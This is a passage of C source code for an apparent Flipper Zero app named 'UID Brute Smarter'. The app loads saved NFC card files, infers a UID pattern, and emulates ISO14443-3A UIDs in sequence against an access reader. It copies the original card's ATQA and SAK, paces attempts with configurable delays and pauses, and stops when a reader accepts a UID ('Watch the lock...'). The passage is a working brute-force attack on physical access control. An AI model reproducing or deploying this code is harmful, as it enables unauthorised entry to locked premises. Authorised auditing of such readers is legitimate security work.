                    } else {
                        popup_set_header(instance->popup, "Error", 64, 20, AlignCenter, AlignTop);
                        popup_set_text(instance->popup, "Invalid file format!", 64, 40, AlignCenter, AlignTop);
                    }
                    popup_set_timeout(instance->popup, POPUP_TIMEOUT_MS);
                    popup_enable_timeout(instance->popup);
                    popup_set_callback(instance->popup, uid_brute_smarter_hit_popup_callback);
                    popup_set_context(instance->popup, instance);
                    uid_brute_smarter_setup_menu(instance);
                    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewPopup);
                }
                
                furi_string_free(file_path);
                furi_string_free(nfc_folder);
                furi_record_close(RECORD_DIALOGS);
            }
            break;
        case 1: // View Keys
            uid_brute_smarter_show_key_list(instance);
            break;
        case 2: // Configure
            uid_brute_smarter_setup_config(instance);
            uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewConfig);
            break;
        case 3: // Start Brute Force
            DEBUG_LOG("[MENU] Start Brute Force selected");
            DEBUG_LOG("[MENU] UID count: %d", instance->app ? instance->app->uid_count : -1);
            if(instance->app && instance->app->uid_count > 0) {
                DEBUG_LOG("[MENU] Calling uid_brute_smarter_start_brute_force...");
                uid_brute_smarter_start_brute_force(instance);
                DEBUG_LOG("[MENU] Returned from uid_brute_smarter_start_brute_force");
            } else {
                dialog_ex_set_header(instance->dialog_ex, "Error", 64, 10, AlignCenter, AlignTop);
                dialog_ex_set_text(instance->dialog_ex, "No cards loaded!\nLoad .nfc files first", 64, 32, AlignCenter, AlignCenter);
                dialog_ex_set_center_button_text(instance->dialog_ex, "OK");
                uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewBrute);
            }
            break;
        case 4: // About
            view_set_previous_callback(instance->about_view, uid_brute_smarter_about_back_callback);
            uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewAbout);
            break;
    }
}

// Simple timer callback that processes one UID per tick
static void uid_brute_smarter_timer_callback(void* context) {
    static uint32_t callback_count = 0;
    callback_count++;
    DEBUG_LOG("[TIMER] Callback entered (#%lu)", callback_count);
    
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    
    // Critical: Validate context and timer state before any operations
    if(!instance || !instance->app || !instance->brute_timer) {
        ERROR_LOG("[TIMER] Invalid context or timer state in callback");
        return;
    }
    
    DEBUG_LOG("[TIMER] Context valid, is_running=%d, should_stop=%d, iteration=%lu/%lu",
              instance->app->is_running,
              instance->app->should_stop,
              instance->current_iteration,
              instance->app->total_range_size);

    // This tick is the one firing after a pause: restore the normal cadence
    // before doing anything else, otherwise the periodic timer stays at the
    // elongated pause period for the rest of the run.
    if(instance->app->timer_period_elevated) {
        instance->app->timer_period_elevated = false;
        furi_timer_start(instance->brute_timer, instance->app->delay_ms);
    }

    // Additional safety: Check if we're still in brute force view
    if(!instance->app->is_running) {
        DEBUG_LOG("[TIMER] App not running, stopping timer");
        furi_timer_stop(instance->brute_timer);
        return;
    }

    // Hit detection: if the reader engaged the previously emulated UID and
    // stop-on-hit is configured, finish the run with the accepted candidate
    // instead of stepping further.
    if(instance->hit_detected && instance->app->stop_on_hit) {
        uint32_t accepted_uid = instance->hit_uid;
        DEBUG_LOG("[TIMER] Reader accepted UID %08lX, stopping", accepted_uid);
        furi_timer_stop(instance->brute_timer);
        instance->app->is_running = false;

        if(instance->listener) {
            nfc_listener_stop(instance->listener);
            nfc_listener_free(instance->listener);
            instance->listener = NULL;
        }
        if(instance->nfc_device) {
            nfc_device_clear(instance->nfc_device);
        }

        char hit_text[80];
        snprintf(
            hit_text,
            sizeof(hit_text),
            "Reader accepted UID:\n%02X%02X%02X%08lX\nWatch the lock...",
            instance->app->uid_prefix[0],
            instance->app->uid_prefix[1],
            instance->app->uid_prefix[2],
            accepted_uid);
        if(instance->app->uid_len != EXTENDED_UID_LENGTH) {
            snprintf(hit_text, sizeof(hit_text), "Reader accepted UID:\n%08lX\nWatch the lock...", accepted_uid);
        }
        popup_set_header(instance->popup, "HIT", 64, 12, AlignCenter, AlignTop);
        popup_set_text(instance->popup, hit_text, 64, 36, AlignCenter, AlignTop);
        popup_set_timeout(instance->popup, 4000);
        popup_enable_timeout(instance->popup);
        popup_set_callback(instance->popup, uid_brute_smarter_hit_popup_callback);
        popup_set_context(instance->popup, instance);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewPopup);
        return;
    }

    // Check if we should stop
    if(instance->app->should_stop) {
        DEBUG_LOG("[TIMER] Stop requested, cleaning up");
        furi_timer_stop(instance->brute_timer);
        instance->app->is_running = false;

        // Clean up NFC resources
        if(instance->listener) {
            nfc_listener_stop(instance->listener);
            nfc_listener_free(instance->listener);
            instance->listener = NULL;
        }
        if(instance->nfc_device) {
            nfc_device_clear(instance->nfc_device);
        }

        // Go directly back to menu
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
        return;
    }

    // Check if we've completed all UIDs
    if(instance->current_iteration >= instance->app->total_range_size) {
        DEBUG_LOG("[TIMER] Brute force complete");
        furi_timer_stop(instance->brute_timer);
        instance->app->is_running = false;

        // Clean up NFC resources
        if(instance->listener) {
            nfc_listener_stop(instance->listener);
            nfc_listener_free(instance->listener);
            instance->listener = NULL;
        }
        if(instance->nfc_device) {
            nfc_device_clear(instance->nfc_device);
        }

        // Show completion popup then go back to menu
        popup_set_header(instance->popup, "Complete", 64, 20, AlignCenter, AlignTop);
        popup_set_text(instance->popup, "Brute force finished", 64, 40, AlignCenter, AlignCenter);
        popup_set_timeout(instance->popup, 1500);
        popup_enable_timeout(instance->popup);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
        return;
    }

    // Calculate current UID on-the-fly (no pre-generated array!)
    uint32_t current_uid = uid_brute_smarter_calculate_uid(instance, instance->current_iteration);
    instance->app->current_uid = current_uid;

    DEBUG_LOG("[TIMER] Processing UID %08lX (iteration %lu/%lu)",
              current_uid, instance->current_iteration + 1, instance->app->total_range_size);

    // Update progress display with reader engagement feedback
    char progress_text[64];
    snprintf(progress_text, sizeof(progress_text),
        "UID: %08lX  %lu/%lu\nReader cmds: %lu  HALT: %lu",
        current_uid,
        instance->current_iteration + 1,
        instance->app->total_range_size,
        instance->reader_engagements,
        instance->reader_halted);
    dialog_ex_set_text(instance->dialog_ex, progress_text, 64, 32, AlignCenter, AlignCenter);

    // Emulate this UID with timeout protection
    instance->last_emulation_time = furi_get_tick();
    uid_brute_smarter_emulate_uid(instance, current_uid);

    // Move to next UID
    instance->current_iteration++;
    instance->app->total_attempts++;
    
    // Handle pause logic
    if(instance->app->pause_every > 0) {
        instance->app->pause_counter++;
        if(instance->app->pause_counter >= instance->app->pause_every) {
            // Stop timer for pause duration
            furi_timer_stop(instance->brute_timer);
            
            // Show pause message
            char pause_text[64];
            snprintf(pause_text, sizeof(pause_text), "Pausing for %lu seconds...", instance->app->pause_duration_s);
            dialog_ex_set_text(instance->dialog_ex, pause_text, 64, 32, AlignCenter, AlignCenter);
            
            // Restart timer after pause; restored to the normal cadence on the next tick above
            instance->app->timer_period_elevated = true;
            furi_timer_start(instance->brute_timer, instance->app->pause_duration_s * 1000 + instance->app->delay_ms);

            instance->app->pause_counter = 0;
            return;
        }
    }
}

// Simple UID emulation function (no threading)
static void uid_brute_smarter_emulate_uid(UidBruteSmarter* instance, uint32_t uid) {
    DEBUG_LOG("[EMULATE] Starting emulation for UID: %08lX", uid);
    
    // Critical safety checks
    if(!instance || !instance->nfc || !instance->nfc_device) {
        ERROR_LOG("[EMULATE] Invalid instance or NFC not initialized");
        return;
    }
    
    // Stop any existing listener with proper error handling
    if(instance->listener) {
        nfc_listener_stop(instance->listener);
        nfc_listener_free(instance->listener);
        instance->listener = NULL;
    }
    
    // Create ISO14443-3A data with comprehensive error handling
    Iso14443_3aData* iso_data = iso14443_3a_alloc();
    if(!iso_data) {
        ERROR_LOG("[EMULATE] Failed to allocate ISO data - memory exhausted");
        // Attempt to clear device state and retry once
        nfc_device_clear(instance->nfc_device);
        iso_data = iso14443_3a_alloc();
        if(!iso_data) {
            ERROR_LOG("[EMULATE] Retry failed - aborting emulation");
            return;
        }
        DEBUG_LOG("[EMULATE] Retry succeeded after device clear");
    }
    
    // Set UID data
    iso14443_3a_reset(iso_data);
    UidBruteSmartApp* app = instance->app;
    uint8_t uid_bytes[EXTENDED_UID_LENGTH] = {0};
    uint8_t uid_len = app->uid_len == EXTENDED_UID_LENGTH ? EXTENDED_UID_LENGTH : STANDARD_UID_LENGTH;
    if(uid_len == EXTENDED_UID_LENGTH) {
        // 7-byte UID: fixed manufacturer prefix + variable low 4 bytes.
        // The pattern engine plans the range over the variable part only.
        memcpy(uid_bytes, app->uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
    }
    uid_bytes[uid_len - 4] = (uint8_t)((uid >> 24) & 0xFF);
    uid_bytes[uid_len - 3] = (uint8_t)((uid >> 16) & 0xFF);
    uid_bytes[uid_len - 2] = (uint8_t)((uid >> 8) & 0xFF);
    uid_bytes[uid_len - 1] = (uint8_t)(uid & 0xFF);
    iso14443_3a_set_uid(iso_data, uid_bytes, uid_len);

    // Set ATQA and SAK taken from the audited card so the reader sees the
    // same tag characteristics as the original (UID size bits included).
    const uint8_t atqa_bytes[2] = {app->atqa[0], app->atqa[1]};
    iso14443_3a_set_atqa(iso_data, atqa_bytes);
    iso14443_3a_set_sak(iso_data, app->sak);
    
    // Set data in NFC device
    nfc_device_clear(instance->nfc_device);
    nfc_device_set_data(instance->nfc_device, NfcProtocolIso14443_3a, iso_data);
    
    // Start emulation following official pattern with enhanced error handling
    const Iso14443_3aData* device_data = nfc_device_get_data(instance->nfc_device, NfcProtocolIso14443_3a);
    if(!device_data) {
        ERROR_LOG("[EMULATE] Failed to get device data");
        goto cleanup;
    }
    
    instance->listener = nfc_listener_alloc(instance->nfc, NfcProtocolIso14443_3a, device_data);
    if(!instance->listener) {
        ERROR_LOG("[EMULATE] Failed to allocate NFC listener for UID: %08lX", uid);
        goto cleanup;
    }

    nfc_listener_start(instance->listener, uid_brute_smarter_listener_callback, instance);
    // Note: nfc_listener_start doesn't return a value, so we assume it succeeds
    // If there are issues, they'll be handled by the NFC system itself
    
    DEBUG_LOG("[EMULATE] NFC emulation started successfully for UID: %08lX", uid);
    
cleanup:
    // Clean up ISO data (moved to cleanup section)
    if(iso_data) {
        iso14443_3a_free(iso_data);
    }
}


static void uid_brute_smarter_start_brute_force(UidBruteSmarter* instance) {
    DEBUG_LOG("[START_BRUTE] Starting simple brute force");
    
    if(!instance || !instance->app || !instance->view_dispatcher || !instance->popup) {
        ERROR_LOG("[START_BRUTE] Invalid instance, app, view_dispatcher, or popup");
        return;
    }
    
    if(instance->brute_timer) {
        furi_timer_stop(instance->brute_timer);
        furi_timer_free(instance->brute_timer);
        instance->brute_timer = NULL;
    }
    
    if(!instance->nfc || !instance->nfc_device) {
        ERROR_LOG("[START_BRUTE] NFC not initialized");
        return;
    }
    
    if(instance->app->is_running) {
        WARN_LOG("[START_BRUTE] Brute force already running");
        return;
    }
    
    if(instance->app->uid_count == 0) {
        ERROR_LOG("[START_BRUTE] No UIDs loaded");
        return;
    }
    
    PatternResult result;
    if(!pattern_engine_detect(instance->app->uids, instance->app->uid_count, &result)) {
        ERROR_LOG("[START_BRUTE] Pattern detection failed");
        dialog_ex_set_header(instance->dialog_ex, "Error", 64, 10, AlignCenter, AlignTop);
        dialog_ex_set_text(instance->dialog_ex, "Pattern detection failed!\nCheck loaded cards", 64, 32, AlignCenter, AlignCenter);
        dialog_ex_set_center_button_text(instance->dialog_ex, "OK");
        dialog_ex_set_context(instance->dialog_ex, instance);
        dialog_ex_set_result_callback(instance->dialog_ex, NULL);
        view_set_previous_callback(dialog_ex_get_view(instance->dialog_ex), uid_brute_smarter_brute_back_callback);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewBrute);
        return;
    }

    if(result.range_size == 0) {
        ERROR_LOG("[START_BRUTE] Invalid range size: 0");
        dialog_ex_set_header(instance->dialog_ex, "Error", 64, 10, AlignCenter, AlignTop);
        dialog_ex_set_text(instance->dialog_ex, "Invalid range size: 0\nCheck loaded cards", 64, 32, AlignCenter, AlignCenter);
        dialog_ex_set_center_button_text(instance->dialog_ex, "OK");
        dialog_ex_set_context(instance->dialog_ex, instance);
        dialog_ex_set_result_callback(instance->dialog_ex, NULL);
        view_set_previous_callback(dialog_ex_get_view(instance->dialog_ex), uid_brute_smarter_brute_back_callback);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewBrute);
        return;
    }

    // Store pattern info for on-the-fly UID calculation (no pre-generation!)
    instance->app->pattern = result.type;
    instance->app->start_uid = result.start_uid;
    instance->app->end_uid = result.end_uid;
    instance->app->step = result.step;
    instance->app->bitmask = result.bitmask;
    instance->app->total_range_size = result.range_size;

    INFO_LOG("[START_BRUTE] Pattern: %s, Range: %08lX-%08lX, Step: %lu, Size: %lu UIDs",
             pattern_engine_get_name(result.type),
             result.start_uid, result.end_uid, result.step, result.range_size);

    instance->current_iteration = 0;
    instance->app->should_stop = false;
    instance->app->total_attempts = 0;
    instance->app->pause_counter = 0;
    instance->app->timer_period_elevated = false;
    instance->hit_detected = false;
    instance->hit_uid = 0;
    instance->reader_engagements = 0;
    instance->reader_halted = 0;

    // Set header with pattern name
    snprintf(instance->brute_header, sizeof(instance->brute_header), "BF: %s", pattern_engine_get_name(result.type));
    dialog_ex_set_header(instance->dialog_ex, instance->brute_header, 64, 10, AlignCenter, AlignTop);
    dialog_ex_set_text(instance->dialog_ex, "Starting...", 64, 32, AlignCenter, AlignCenter);
    dialog_ex_set_center_button_text(instance->dialog_ex, "Stop");
    dialog_ex_set_context(instance->dialog_ex, instance);
    dialog_ex_set_result_callback(instance->dialog_ex, uid_brute_smarter_brute_callback);
    
    view_set_previous_callback(dialog_ex_get_view(instance->dialog_ex), uid_brute_smarter_brute_back_callback);
    
    instance->brute_timer = furi_timer_alloc(uid_brute_smarter_timer_callback, FuriTimerTypePeriodic, instance);
    if(!instance->brute_timer) {
        ERROR_LOG("[START_BRUTE] Failed to allocate timer");
        dialog_ex_set_header(instance->dialog_ex, "Error", 64, 10, AlignCenter, AlignTop);
        dialog_ex_set_text(instance->dialog_ex, "Timer allocation failed!\nRestart app", 64, 32, AlignCenter, AlignCenter);
        dialog_ex_set_center_button_text(instance->dialog_ex, "OK");
        dialog_ex_set_context(instance->dialog_ex, instance);
        dialog_ex_set_result_callback(instance->dialog_ex, NULL);
        view_set_previous_callback(dialog_ex_get_view(instance->dialog_ex), uid_brute_smarter_brute_back_callback);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewBrute);
        return;
    }
    
    furi_timer_start(instance->brute_timer, instance->app->delay_ms);
    instance->app->is_running = true;
    
    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewBrute);
}

static void uid_brute_smarter_config_delay_change(VariableItem* item) {
    UidBruteSmarter* instance = (UidBruteSmarter*)variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    
    // Map index to delay (MIN_DELAY_MS to MAX_DELAY_MS in steps)
    instance->app->delay_ms = MIN_DELAY_MS + (index * DELAY_STEP_MS);
    char delay_str[16];
    snprintf(delay_str, sizeof(delay_str), "%lu ms", instance->app->delay_ms);
    variable_item_set_current_value_text(item, delay_str);
}

static void uid_brute_smarter_config_pause_every_change(VariableItem* item) {
    UidBruteSmarter* instance = (UidBruteSmarter*)variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    
    instance->app->pause_every = index * PAUSE_STEP; // 0 to MAX_PAUSE_EVERY in steps
    char pause_str[16];
    snprintf(pause_str, sizeof(pause_str), "%lu", instance->app->pause_every);
    variable_item_set_current_value_text(item, pause_str);
}

static void uid_brute_smarter_config_pause_duration_change(VariableItem* item) {
    UidBruteSmarter* instance = (UidBruteSmarter*)variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    
    instance->app->pause_duration_s = MIN(index, MAX_PAUSE_DURATION_S); // 0 to MAX_PAUSE_DURATION_S seconds
    char duration_str[16];
    snprintf(duration_str, sizeof(duration_str), "%lu s", instance->app->pause_duration_s);
    variable_item_set_current_value_text(item, duration_str);
}

static const char* const stop_on_hit_names[] = {"Off", "On"};

static void uid_brute_smarter_config_stop_on_hit_change(VariableItem* item) {
    UidBruteSmarter* instance = (UidBruteSmarter*)variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);

    instance->app->stop_on_hit = (index != 0);
    variable_item_set_current_value_text(item, stop_on_hit_names[index]);
}

static uint32_t uid_brute_smarter_config_back_callback(void* context) {
    UNUSED(context);
    
    DEBUG_LOG("[CONFIG] Back button pressed, returning to main menu");
    return UidBruteSmarterViewMenu;
}

static uint32_t uid_brute_smarter_key_list_back_callback(void* context) {
    UNUSED(context);
    
    DEBUG_LOG("[KEY_LIST] Back button pressed, returning to main menu");
    
    return UidBruteSmarterViewMenu;
}

static uint32_t uid_brute_smarter_about_back_callback(void* context) {
    UNUSED(context);

    DEBUG_LOG("[ABOUT] Back button pressed, returning to main menu");

    return UidBruteSmarterViewMenu;
}

static void uid_brute_smarter_hit_popup_callback(void* context) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;

    DEBUG_LOG("[POPUP] Popup done, returning to main menu");

    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
}

static uint32_t uid_brute_smarter_brute_back_callback(void* context) {
    DEBUG_LOG("[BACK] Back/Center button pressed - stopping brute force");
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    
    if(!instance) {
        ERROR_LOG("[BACK] NULL instance in back callback!");
        return UidBruteSmarterViewMenu;
    }
    
    if(!uid_brute_smarter_is_key_debounced(instance)) {
        return UidBruteSmarterViewBrute;
    }
    
    // Set stop flag first to prevent race conditions
    if(instance->app) {
        instance->app->should_stop = true;
        instance->app->is_running = false;
    }
    
    // Wait a brief moment for timer to process stop flag
    furi_delay_ms(50);
    
    // Stop the timer with validation
    if(instance->brute_timer) {
        furi_timer_stop(instance->brute_timer);
        furi_timer_free(instance->brute_timer);
        instance->brute_timer = NULL;
        DEBUG_LOG("[BACK] Timer stopped and freed");
    }
    
    // Stop NFC listener with error handling
    if(instance->listener) {
        nfc_listener_stop(instance->listener);
        nfc_listener_free(instance->listener);
        instance->listener = NULL;
        DEBUG_LOG("[BACK] NFC listener stopped and freed");
    }
    
    // Clear NFC device state
    if(instance->nfc_device) {
        nfc_device_clear(instance->nfc_device);
        DEBUG_LOG("[BACK] NFC device state cleared");
    }

    DEBUG_LOG("[BACK] Brute force stopped, returning to menu");

    // Return to main menu
    return UidBruteSmarterViewMenu;
}

static void uid_brute_smarter_setup_config(UidBruteSmarter* instance) {
    variable_item_list_reset(instance->variable_item_list);
    
    VariableItem* item;
    char value_str[16];
    
    // Delay setting
    item = variable_item_list_add(
        instance->variable_item_list, "Delay", 10, uid_brute_smarter_config_delay_change, instance);
    uint8_t delay_index = (instance->app->delay_ms - MIN_DELAY_MS) / DELAY_STEP_MS;
    if(delay_index > 9) delay_index = (DEFAULT_DELAY_MS - MIN_DELAY_MS) / DELAY_STEP_MS; // Default index
    snprintf(value_str, sizeof(value_str), "%lu ms", instance->app->delay_ms);
    variable_item_set_current_value_index(item, delay_index);
    variable_item_set_current_value_text(item, value_str);
    
    // Pause every N attempts
    item = variable_item_list_add(
        instance->variable_item_list, "Pause Every", 11, uid_brute_smarter_config_pause_every_change, instance);
    uint8_t pause_index = instance->app->pause_every / PAUSE_STEP;
    snprintf(value_str, sizeof(value_str), "%lu", instance->app->pause_every);
    variable_item_set_current_value_index(item, pause_index);
    variable_item_set_current_value_text(item, value_str);
    
    // Pause duration
    item = variable_item_list_add(
        instance->variable_item_list, "Pause Duration", 11, uid_brute_smarter_config_pause_duration_change, instance);
    snprintf(value_str, sizeof(value_str), "%lu s", instance->app->pause_duration_s);
    variable_item_set_current_value_index(item, instance->app->pause_duration_s);
    variable_item_set_current_value_text(item, value_str);

    // Stop the run when a reader engages the emulated UID
    item = variable_item_list_add(
        instance->variable_item_list,
        "Stop on Hit",
        COUNT_OF(stop_on_hit_names),
        uid_brute_smarter_config_stop_on_hit_change,
        instance);
    variable_item_set_current_value_index(item, instance->app->stop_on_hit ? 1 : 0);
    variable_item_set_current_value_text(item, stop_on_hit_names[instance->app->stop_on_hit ? 1 : 0]);
    
    // Set previous callback to handle back button
    view_set_previous_callback(
        variable_item_list_get_view(instance->variable_item_list), 
        uid_brute_smarter_config_back_callback);
}

static void uid_brute_smarter_setup_menu(UidBruteSmarter* instance) {
    submenu_reset(instance->submenu);
    submenu_set_header(instance->submenu, "UID Brute Smarter");
    submenu_add_item(instance->submenu, "Load Cards", 0, uid_brute_smarter_menu_callback, instance);
    
    // Only show "View Keys" if keys are loaded
    if(instance->loaded_keys_count > 0) {
        char view_keys_text[32];
        snprintf(view_keys_text, sizeof(view_keys_text), "View Keys (%d)", instance->loaded_keys_count);
        submenu_add_item(instance->submenu, view_keys_text, 1, uid_brute_smarter_menu_callback, instance);
    }
    
    submenu_add_item(instance->submenu, "Configure", 2, uid_brute_smarter_menu_callback, instance);
    submenu_add_item(instance->submenu, "Start Brute Force", 3, uid_brute_smarter_menu_callback, instance);
    submenu_add_item(instance->submenu, "About", 4, uid_brute_smarter_menu_callback, instance);

    view_set_previous_callback(submenu_get_view(instance->submenu), uid_brute_smarter_exit_callback);
}

// Removed - not needed with proper view handling

int32_t uid_brute_smarter_app(void* p) {
    UNUSED(p);
    
    UidBruteSmarter* instance = uid_brute_smarter_alloc();
    if(!instance) {
        ERROR_LOG("[APP] Failed to allocate instance");
        return -1;
    }
    
    // Setup menu
    uid_brute_smarter_setup_menu(instance);
    
    // Show splash screen
    uid_brute_smarter_show_splash(instance);
    
    // Run view dispatcher
    view_dispatcher_run(instance->view_dispatcher);
    
    // Cleanup
    uid_brute_smarter_free(instance);
    
    return 0;
}